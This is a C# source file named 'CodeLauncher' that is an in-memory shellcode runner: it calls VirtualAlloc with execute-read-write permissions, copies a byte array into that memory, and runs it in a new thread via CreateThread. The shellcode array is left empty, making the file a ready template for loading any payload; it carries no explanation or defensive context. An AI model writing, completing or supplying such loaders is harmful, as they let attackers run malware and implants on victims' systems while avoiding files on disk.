using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace CodeLauncher
{
    public class Program
    {
        public Program()
		{
			Main();
		}
		static void Main()
        {
			byte[] ShellCode = new byte[0] { };
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)ShellCode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(ShellCode, 0, (IntPtr)(funcAddr), ShellCode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
          );
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
    }
}